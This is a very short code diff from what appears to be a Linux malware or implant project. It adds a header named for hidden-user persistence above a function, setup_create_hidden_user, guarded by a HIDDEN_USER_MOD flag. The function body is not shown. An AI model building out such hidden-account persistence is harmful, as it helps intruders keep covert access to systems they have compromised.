@@ -3,7 +3,7 @@
 #include <string.h>
 #include <unistd.h>
 #include "info.h"
-
+#include "linux_persistence_hidden_user.h"
 
 #ifdef HIDDEN_USER_MOD
 void setup_create_hidden_user() {
